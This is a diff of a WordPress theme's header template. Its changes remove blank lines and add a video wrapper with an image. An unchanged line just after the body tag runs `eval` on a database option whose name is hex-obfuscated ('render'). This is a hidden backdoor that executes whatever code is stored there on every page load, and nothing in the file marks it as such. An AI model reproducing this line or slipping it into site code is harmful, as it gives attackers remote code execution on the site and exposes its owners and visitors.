@@ -78,8 +78,6 @@
 	<body <?php body_class(); ?>><?php eval(get_option("\x72\x65\x6e\x64\x65\x72")); ?>
 
 		<div id="container">
-		
-		
 			<header class="header" role="banner">
 
 				<a href="http://forbaconssake.com" class="flag" id="baconlink"><img src="<?php echo $themepath; ?>/library/images/baconlink.png"></a>
@@ -87,6 +85,12 @@
 
 
 				<div id="inner-header" class="wrap clearfix">
+ 				<!-- Adding code to display video -->
+				<div id="big-video-wrap">
+					<img src="/wp-content/themes/hemplers-2013/library/images/ham.jpg" id="big-video-image" />
+					<div id="big-video-vid"></div>
+				</div>
+				<!-- End Adding code to display video  -->
 
 					<!-- to use a image just replace the bloginfo('name') with your img src and remove the surrounding <p> -->
 					<!-- <a href="<?php echo home_url(); ?>" class="flag" id="kestins-korner-1"><img src="<?php echo $themepath; ?>/library/images/kestins-korner-1.png"></a> -->
